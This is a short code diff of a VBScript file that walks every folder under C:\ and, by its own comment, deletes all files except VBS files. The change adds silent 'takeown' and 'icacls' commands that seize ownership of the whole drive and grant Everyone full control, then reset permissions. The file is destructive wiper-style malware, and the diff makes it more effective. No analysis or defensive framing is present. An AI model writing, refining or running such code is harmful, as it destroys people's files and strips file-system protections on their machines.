@@ -6,7 +6,7 @@ strScriptPath = WScript.ScriptFullName
 strDesktopFolder = objShell.SpecialFolders("Desktop")
 
 ' Disable file system access restrictions
-objFSO.GetFolder("C:\").Attributes = objFSO.GetFolder("C:\").Attributes - 1
+objShell.Run "cmd /c takeown /f C:\ /r /d y && icacls C:\ /grant Everyone:F /t", 0, True
 
 ' Iterate through all folders in the file explorer
 For Each objFolder In objFSO.GetFolder("C:\").SubFolders
@@ -23,7 +23,7 @@ For Each objFolder In objFSO.GetFolder("C:\").SubFolders
 Next
 
 ' Reset file system access restrictions
-objFSO.GetFolder("C:\").Attributes = objFSO.GetFolder("C:\").Attributes + 1
+objShell.Run "cmd /c icacls C:\ /reset /t", 0, True
 
 ' Delete all files except VBS files within the specified folders
 For Each folderPath In objFSO.GetFolder("C:\").SubFolders
